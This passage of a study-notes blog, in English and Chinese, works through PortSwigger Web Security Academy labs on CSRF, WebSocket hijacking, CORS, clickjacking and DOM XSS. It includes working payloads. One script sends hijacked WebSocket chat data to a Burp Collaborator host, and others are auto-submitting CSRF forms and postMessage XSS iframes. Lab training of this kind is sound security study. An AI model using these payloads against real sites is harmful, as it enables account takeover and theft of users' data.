blocker.<imgsrc="https://s2.loli.net/2023/08/17/rKI58QtASFGCdfN.png"alt="image-20230817074621992" /></p></li></ol></li><li><p>script</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"POST"</span> action<span class="token operator">=</span><span class="token string">"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"pwned@portswigger.net"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span>p<span class="token operator">></span>Click anywhere on the page<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token comment">// !important</span>    window<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/social-login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeEmail<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">changeEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li></ol><h4id="lab-csrf-where-referer-validation-depends-on-header-being-present">Lab:CSRF where Referer validation depends on header being present</h4><ol type="1"><li>modify referer header: report error<imgsrc="https://s2.loli.net/2023/08/17/bGkQfTsig7dJxP6.png"alt="image-20230817090913772" /></li><li>delete referer: response <code>302</code></li><li>generate PoC: add this line<imgsrc="https://s2.loli.net/2023/08/17/2NW1RnSuyIKF5de.png"alt="image-20230817091054878" /></li></ol><h4 id="lab-csrf-with-broken-referer-validation">Lab: CSRF with brokenReferer validation</h4><ol type="1"><li><p>as long as referer containts string required,<imgsrc="https://s2.loli.net/2023/08/17/QgmUVcwTsea5Bn6.png"alt="image-20230817094046015" /></p><ol type="1"><li><p>script</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"/?YOUR-LAB-ID.web-security-academy.net"</span><span class="token punctuation">)</span></code></pre><ol type="1"><li>history.pushState是HTML5中新增的方法,可以修改浏览器历史状态。</li><li>第一个参数是标题,第二个是URL路径,第三个是状态对象。</li><li>这里设置了一个包含目标域的查询字符串作为状态对象。</li><li>当exploit中的表单被自动提交时,请求的Referer头会包含这个状态对象。</li><li>也就是请求会包含目标域作为查询字符串的Referer。</li><li>这样可以绕过服务端仅验证域的Referer校验。</li><li>让exploit对任意用户都能正常工作。</li></ol></li><li><p>many browsers now strip the query string from the Referer headerby default as a security measure. To override this behavior and ensurethat the full URL is included in the request, go back to the exploitserver and add the following header to the "Head" section:</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Referrer-Policy</span><span class="token punctuation">:</span> <span class="token header-value">unsafe-url</span></span></code></pre></li></ol></li></ol><h3 id="testing-for-websockets-security-vulnerabilities">Testing forWebSockets security vulnerabilities</h3><h4 id="what-is-the-difference-between-http-and-websockets">What is thedifference between HTTP and WebSockets?</h4><ol type="1"><li>WebSockets are particularly useful in situations where<code>low-latency</code> or <code>server-initiated messages</code> arerequired, such as <code>real-time feeds</code> of financial data</li></ol><h4id="lab-manipulating-websocket-messages-to-exploit-vulnerabilities">Lab:Manipulating WebSocket messages to exploit vulnerabilities</h4><ol type="1"><li>in <strong>live chat</strong> function,intercept request</li><li>modify WebSocket message<imgsrc="https://s2.loli.net/2023/08/16/jODVoeldvSCEz4i.png"alt="image-20230816113748837" /></li></ol><h4id="lab-manipulating-the-websocket-handshake-to-exploit-vulnerabilities">Lab:Manipulating the WebSocket handshake to exploit vulnerabilities</h4><ol type="1"><li><p>detected attacked <imgsrc="https://s2.loli.net/2023/08/16/7ifa2qskETZLOzt.png"alt="image-20230816115940712" /></p></li><li><p>and we can't reconnect:ip was banned</p></li><li><p>use <code>X-Forwarded-For</code> reconnect<imgsrc="https://s2.loli.net/2023/08/16/PMmEhI354Uiegvb.png"alt="image-20230816120141846" /></p></li><li><p>payload: Case bypass</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">oNeRrOr</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span></span><span class="token punctuation">></span></span></code></pre></li></ol><h4 id="cross-site-websocket-hijacking">Cross-site WebSockethijacking</h4><h4 id="lab-cross-site-websocket-hijacking">Lab: Cross-site WebSockethijacking</h4><ol type="1"><li><p>observe <code>ready</code> command is used to ready tocommunicate <imgsrc="https://s2.loli.net/2023/08/17/T2oQyEJGHnpOxsc.png"alt="image-20230817045525402" /></p></li><li><p>craft <code>script</code></p></li></ol><p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">var</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'wss://0a4500b303e6b1de81902fec00ed00d2.web-security-academy.net/chat'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"READY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://oc45i5yhmqkyayfg8skal62xioofc50u.oastify.com'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span> <span class="token literal-property property">body</span><span class="token operator">:</span> event<span class="token punctuation">.</span>data<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></p><ol type="1"><li><p>in exploit server <imgsrc="https://s2.loli.net/2023/08/17/VBj5DUnlX846TKv.png"alt="image-20230817045713355" /></p></li><li><p>click <code>view exploit</code></p></li><li><p>in burp collaborator: cick <code>poll</code></p><ol type="1"><li>observe past message</li></ol></li><li><p>click <code>deliver exploit to victim</code></p><ol type="1"><li>received more messages</li></ol></li></ol><h3 id="cross-origin-resource-sharing-cors">Cross-origin resourcesharing (CORS)</h3><h4 id="what-is-the-same-origin-policy">What is the same-originpolicy?</h4><ol type="1"><li><p>example</p><table><colgroup><col style="width: 54%" /><col style="width: 45%" /></colgroup><thead><tr class="header"><th>URL accessed</th><th>Access permitted?</th></tr></thead><tbody><tr class="odd"><td><code>http://normal-website.com/example/</code></td><td>Yes: same scheme, domain, and port</td></tr><tr class="even"><td><code>http://normal-website.com/example2/</code></td><td>Yes: same scheme, domain, and port</td></tr><tr class="odd"><td><code>https://normal-website.com/example/</code></td><td>No: different scheme and port</td></tr><tr class="even"><td><code>http://en.normal-website.com/example/</code></td><td>No: different domain</td></tr><tr class="odd"><td><code>http://www.normal-website.com/example/</code></td><td>No: different domain</td></tr><tr class="even"><td><code>http://normal-website.com:8080/example/</code></td><td>No: different port*</td></tr></tbody></table></li></ol><h4 id="lab-cors-vulnerability-with-basic-origin-reflection">Lab: CORSvulnerability with basic origin reflection</h4><ol type="1"><li>notice that header<code>Access-Control-Allow-Credentials: true</code><imgsrc="https://s2.loli.net/2023/08/20/dV2gjfnNae31RlL.png"alt="image-20230820103305887" /></li><li>add this line: <imgsrc="https://s2.loli.net/2023/08/20/D2AUFZO3SLm4v9l.png"alt="image-20230820103416209" /></li><li>craft exploit<imgsrc="https://s2.loli.net/2023/08/20/qDjdx7TK5k2QEXM.png"alt="image-20230820103757657" /></li><li>check access log<imgsrc="https://s2.loli.net/2023/08/20/oBQlXhEZjqIFc5L.png"alt="image-20230820103826679" /><imgsrc="https://s2.loli.net/2023/08/20/Ll8HNXCyzi5uUk9.png"alt="image-20230820103836444" /></li></ol><h4 id="labcors-vulnerability-with-trusted-null-origin">Lab:CORSvulnerability with trusted null origin</h4><ol type="1"><li><code>Orgin:null</code><imgsrc="https://s2.loli.net/2023/08/20/UjRV7MuFzBSPWAs.png"alt="image-20230820112506269" /></li><li>craft exploit: <imgsrc="https://s2.loli.net/2023/08/20/TDjfFL3kagJIBCN.png"alt="image-20230820112853516" /></li></ol><h4 id="lab-cors-vulnerability-with-trusted-insecure-protocols">Lab:CORS vulnerability with trusted insecure protocols</h4><ol type="1"><li>Send the request to Burp Repeater, and resubmit it with the addedheader <code>Origin: http://subdomain.lab-id</code> where<code>lab-id</code> is the lab domain name.</li><li>Observe that the origin is reflected in the<code>Access-Control-Allow-Origin</code> header, confirming that theCORS configuration allows access from arbitrary subdomains, both HTTPSand HTTP.</li><li>craft exploit<imgsrc="https://s2.loli.net/2023/08/20/w8LyzAMIPvxrmkb.png"alt="image-20230820114706545" /></li></ol><h4 id="lab-cors-vulnerability-with-internal-network-pivot-attack">Lab:CORS vulnerability with internal network pivot attack</h4><ol type="1"><li>Attempting to obtain the <code>internal IP and port</code> of theapplication<img src="https://s2.loli.net/2023/08/20/E4hglkC9Zvn1dzL.png"alt="image-20230820180141838" /><imgsrc="https://s2.loli.net/2023/08/20/CnszVXkMYiw71pR.png" /></li><li>found xss vulnerbility<imgsrc="https://s2.loli.net/2023/08/20/zdiwFg9CTLbJ4vt.png" /><imgsrc="https://s2.loli.net/2023/08/20/Y2NPt41XdrUSfqi.png" /></li><li>Request the source code of the administrator page.<imgsrc="https://s2.loli.net/2023/08/20/kp1xIECMnoaz4Nb.png"alt="image-20230820180757092" /><imgsrc="https://s2.loli.net/2023/08/20/qfcQHyG5mu81Lrt.png"alt="image-20230820180826954" /></li><li>delete user:carlos<imgsrc="https://s2.loli.net/2023/08/20/2a4u9s8neDESY7h.png"alt="image-20230820180906048" /></li></ol><h3 id="clickjacking-ui-redressing">Clickjacking (UI redressing)</h3><h4 id="lab-basic-clickjacking-with-csrf-token-protection">Lab: Basicclickjacking with CSRF token protection</h4><ol type="1"><li><p>forged webpage</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">    <span class="token selector">iframe</span> <span class="token punctuation">&#123;</span>        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> 700px<span class="token punctuation">;</span>        <span class="token property">opacity</span><span class="token punctuation">:</span> 0.1<span class="token punctuation">;</span>        <span class="token property">z-index</span><span class="token punctuation">:</span> 2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">div</span> <span class="token punctuation">&#123;</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>        <span class="token property">left</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>        <span class="token property">z-index</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Test me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a57003e03ff79e8802f08e0005100f5.web-security-academy.net/my-account<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre></li><li><p>Adjust the positional parameters to make 'delete account' and'click me' overlap<imgsrc="https://s2.loli.net/2023/08/21/nEhacMrdi4zw7Ns.png"alt="image-20230821102934756" /></p></li></ol><h4id="lab-clickjacking-with-form-input-data-prefilled-from-a-url-parameter">Lab:Clickjacking with form input data prefilled from a URL parameter</h4><ol type="1"><li>craft exploit<imgsrc="https://s2.loli.net/2023/08/21/yWVziuDCLGXeZ26.png"alt="image-20230821105014612" /></li></ol><h4 id="lab-clickjacking-with-a-frame-buster-script">Lab: Clickjackingwith a frame buster script</h4><ol type="1"><li>craft exploit<imgsrc="https://s2.loli.net/2023/08/21/xbFV6rtmkW4a3P9.png"alt="image-20230821113149671" /></li></ol><h4id="lab-exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss">Lab:Exploiting clickjacking vulnerability to trigger DOM-based XSS</h4><ol type="1"><li>craft exploit<imgsrc="https://s2.loli.net/2023/08/21/aqUfiAsPIEvzrgb.png"alt="image-20230821114327786" /></li></ol><h4 id="multistep-clickjacking">Multistep clickjacking</h4><ol type="1"><li>craft exploit<imgsrc="https://s2.loli.net/2023/08/21/3NvOrZa8E5DRQIM.png"alt="image-20230821115726865" /></li></ol><h3 id="dom-based-vulnerabilities">DOM-based vulnerabilities</h3><ol type="1"><li>The <code>Document Object Model (DOM)</code> is a web browser'shierarchical representation of the elements on the page</li><li>DOM-based vulnerabilities arise when a website passes data<code>from a source to a sink</code></li></ol><h4 id="dom-based-open-redirection">DOM-based open redirection</h4><ol type="1"><li>DOM-based open-redirection vulnerabilities arise when a scriptwrites attacker-controllable data into a sink that can<code>trigger cross-domain navigation</code>.</li></ol><h4 id="lab-dom-based-open-redirection">Lab: DOM-based openredirection</h4><ol type="1"><li><p>View Source Code<imgsrc="https://s2.loli.net/2023/08/21/95BFyhmHMSsUpQL.png"alt="image-20230821155645322" /></p></li><li><p>这段代码是 HTML 中一个带有 <code>onclick</code>事件的链接，存在开放重定向漏洞。</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>#<span class="token punctuation">'</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript">returnURL <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">url=https?:\/\/.+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span>returnUrl<span class="token punctuation">)</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> returnUrl<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">else</span> location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"/"</span></span><span class="token punctuation">'</span></span></span><span class="token punctuation">></span></span>Back to Blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><ol type="1"><li><code>&lt;a href='#'</code>：这是一个链接标签，其中<code>href='#'</code> 表示链接不会导致页面跳转到其他页面，而只是触发<code>onclick</code> 事件。</li><li><code>onclick='...'</code>：这是链接的 <code>onclick</code>事件处理程序，它包含一段 JavaScript 代码。</li><li><code>returnURL = /url=https?:\/\/.+)/.exec(location);</code>：这段代码尝试使用正则表达式来从当前页面的URL 中提取一个以 "url=" 开头的参数，并将提取的内容赋值给名为<code>returnURL</code> 的变量。</li><li><code>if(returnUrl)</code>：如果成功提取了 URL 参数，即<code>returnURL</code> 不为空，则执行接下来的代码块。</li><li><code>location.href = returnUrl[1];</code>：这行代码将用户的浏览器重定向到<code>returnURL</code> 中提取的 URL。</li><li><code>else location.href = "/";</code>：如果没有提取到 URL参数，则将用户重定向到主页 "/".</li></ol></li><li><p>craft an exploit<imgsrc="https://s2.loli.net/2023/08/21/KaTuchEw6PJsqYe.png"alt="image-20230821155929392" /></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//0a98007c04bd4c9680201ccc00a500b1.web-security-academy.net/post?postId=4&amp;url=https://exploit-0a9c007604614c3c801a1bd0013e00e9.exploit-server.net/</span></span></code></pre></li></ol><h4 id="lab-dom-based-cookie-manipulation">Lab: DOM-based cookiemanipulation</h4><ol type="1"><li><p>craft an exploit<imgsrc="https://s2.loli.net/2023/08/21/fiSGMwmvUcx3I2X.png"alt="image-20230821162840307" /></p><p>这段代码涉及到一个基于客户端的攻击，主要是通过恶意构建的<code>&lt;iframe&gt;</code> 元素和 <code>onload</code>事件处理程序来实现：</p><ol type="1"><li><strong>恶意构建 <code>&lt;iframe&gt;</code>元素</strong>：攻击者创建一个 <code>&lt;iframe&gt;</code> 元素，并设置其<code>src</code> 属性为一个 URL。在 URL中，攻击者构造了一个恶意查询参数，如<code>productId=1&amp;'&gt;&lt;script&gt;print()&lt;/script&gt;</code>，这会在产品ID 后注入一个恶意的 <code>&lt;script&gt;</code> 标签。</li><li><strong><code>onload</code> 事件处理程序</strong>：在<code>&lt;iframe&gt;</code> 元素上设置了 <code>onload</code>事件处理程序。当 <code>&lt;iframe&gt;</code>的内容加载完成后，这个事件处理程序会触发执行。</li><li><strong>事件处理程序逻辑</strong>：<code>onload</code>事件处理程序首先检查一个全局变量 <code>window.x</code>是否已存在。如果不存在，它会将 <code>&lt;iframe&gt;</code> 的<code>src</code> 属性重定向到另一个 URL（首页的 URL），并设置<code>window.x</code> 为 1。</li><li><strong>攻击原理</strong>：当用户访问包含这个恶意构建的<code>&lt;iframe&gt;</code> 元素的页面时，以下操作发生：<ul><li><code>&lt;iframe&gt;</code> 加载开始，请求恶意构建的 URL。</li><li>恶意 URL 中的 <code>&lt;script&gt;</code> 标签（在这里是<code>print()</code>）尝试执行。</li><li>页面中的 <code>onload</code> 事件处理程序触发，检查<code>window.x</code> 是否存在。由于首次加载，<code>window.x</code>不存在。</li><li><code>onload</code> 事件处理程序将 <code>&lt;iframe&gt;</code> 的<code>src</code> 属性重定向到首页的 URL，并设置 <code>window.x</code> 为1。</li><li>用户被重定向回首页。</li></ul></li><li><strong>攻击结果</strong>：用户看到的效果是，他们访问一个页面时，可能会暂时加载一个恶意URL，然后立即被重定向回首页。这个过程可能导致浏览器记录一个恶意URL，而且在用户访问首页时，<code>onload</code>事件处理程序将会被触发，从而执行恶意脚本。</li></ol></li></ol><h4 id="dom-based-javascript-injection">DOM-based JavaScriptinjection</h4><h4 id="dom-based-document-domain-manipulation">DOM-baseddocument-domain manipulation</h4><ol type="1"><li>If two pages from different origins explicitly set the same<code>document.domain</code> value, then those two pages can interact inunrestricted ways</li></ol><h4 id="dom-based-websocket-url-poisoning">DOM-based WebSocket-URLpoisoning</h4><h4 id="dom-based-link-manipulation">DOM-based link manipulation</h4><h4 id="web-message-manipulation">Web message manipulation</h4><h4 id="dom-based-ajax-request-header-manipulation">DOM-based Ajaxrequest-header manipulation</h4><ol type="1"><li>Using Ajax enables a website to make <code>asynchronous</code>requests to the server so that web applications can dynamically changecontent on the page <strong>without</strong> the need to reload theentire page</li><li>Ajax request-header manipulation vulnerabilities arise when a scriptwrites attacker-controllable data into the <code>request header</code>of an Ajax request that is issued using an <code>XmlHttpRequest</code>object.</li></ol><h4 id="dom-based-local-file-path-manipulation">DOM-based localfile-path manipulation</h4><h4 id="dom-based-client-side-sql-injection">DOM-based client-side SQLinjection</h4><h4 id="dom-based-html5-storage-manipulation">DOM-based HTML5-storagemanipulation</h4><h4 id="dom-based-client-side-xpath-injection">DOM-based client-sideXPath injection</h4><h4 id="dom-based-client-side-json-injection">DOM-based client-side JSONinjection</h4><h4 id="dom-data-manipulation">DOM-data manipulation</h4><h4 id="dom-based-denial-of-service">DOM-based denial of service</h4><hr /><ol type="1"><li>an attacker could host a malicious <code>iframe</code> and use the<code>postMessage()</code> method to pass web message data to thevulnerable event listener,</li></ol><h4 id="lab-dom-xss-using-web-messages">Lab: DOM XSS using webmessages</h4><ol type="1"><li><p>Notice that the home page contains an<code>addEventListener()</code> call that listens for a web message.<imgsrc="https://s2.loli.net/2023/08/22/H3DScaIGkzNoOl6.png"alt="image-20230822141102737" /></p><ol type="1"><li><p><code>window.addEventListener('message', function(e) &#123; ... &#125;)</code>:这是一个事件监听器，它监听 <code>message</code> 事件。当其他窗口或iframe 发送一个 Web 消息时，这个事件监听器会被触发。</p></li><li><p><code>function(e) &#123; ... &#125;</code>:这是一个回调函数，它接受一个事件对象<code>e</code>，该事件对象包含了来自其他窗口发送的消息的信息。</p></li><li><p><code>document.getElementById('ads').innerHTML = e.data;</code>:在事件监听器内部，它将从事件对象 <code>e</code> 中获取的消息内容<code>e.data</code> 插入到页面中具有 ID 为 <code>'ads'</code>的元素中。通常情况下，这个元素可能用于展示广告内容。</p></li></ol><p>在上述代码中，事件监听器接收到来自其他窗口或 iframe的消息后，将消息的内容（<code>e.data</code>）直接插入到具有 ID 为<code>'ads'</code> 的元素中，从而改变了 <code>'ads'</code>元素的内容。然而，如果不对消息内容进行适当的验证和过滤，就可能导致恶意的消息被插入到页面中，从而执行攻击者的恶意代码。</p></li><li><p>craft an exploit</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a9d009a04d349e1846245e300aa00ee.web-security-academy.net/<span class="token punctuation">"</span></span>    <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'&lt;img src=1 onerror=print()>'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span></code></pre></li></ol><h4 id="lab-dom-xss-using-web-messages-and-a-javascript-url">Lab: DOMXSS using web messages and a JavaScript URL</h4><ol type="1"><li><p>Notice that the home page contains an<code>addEventListener()</code> call that listens for a web message<imgsrc="https://s2.loli.net/2023/08/22/eyB2ZlqVvQJprkR.png"alt="image-20230822141951901" /></p><p>The JavaScript contains a flawed <code>indexOf()</code> check thatlooks for the strings <code>"http:"</code> or <code>"https:"</code>anywhere within the web message. It also contains the sink<code>location.href</code>.</p></li><li><p>craft an exploit</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-LAB-ID.web-security-academy.net/<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'javascript:print()//http:'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span></code></pre></li></ol><h4 id="lab-dom-xss-using-web-messages-and-json.parse">Lab: DOM XSSusing web messages and JSON.parse</h4><ol type="1"><li><p>Home page js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ACMEplayer <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">element</span><span class="token operator">:</span> iframe <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> d<span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        d <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>d<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string">"page-load"</span><span class="token operator">:</span>            ACMEplayer<span class="token punctuation">.</span>element<span class="token punctuation">.</span><span class="token function">scrollIntoView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">"load-channel"</span><span class="token operator">:</span>            ACMEplayer<span class="token punctuation">.</span>element<span class="token punctuation">.</span>src <span class="token operator">=</span> d<span class="token punctuation">.</span>url<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">"player-height-changed"</span><span class="token operator">:</span>            ACMEplayer<span class="token punctuation">.</span>element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> d<span class="token punctuation">.</span>width <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>            ACMEplayer<span class="token punctuation">.</span>element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height <span class="token operator">=</span> d<span class="token punctuation">.</span>height <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>This event listener expects a string that is parsed using<code>JSON.parse()</code>. In the JavaScript, we can see that the eventlistener expects a <code>type</code> property and that the<code>load-channel</code> case of the <code>switch</code> statementchanges the <code>iframe src</code> attribute.</p></li><li><p>craft an exploit</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>https://YOUR-LAB-ID.web-security-academy.net/</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">"&#123;\"type\":\"load-channel\",\"url\":\"javascript:print()\"&#125;"</span><span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">)</span></span><span class="token punctuation">'</span></span></span><span class="token punctuation">></span></span></code></pre></li></ol><h4 id="dom-clobbering">DOM clobbering</h4><ol type="1"><li>DOM clobbering is a technique in which you <code>inject HTML</code>into a page to manipulate the DOM and ultimately <strong>change 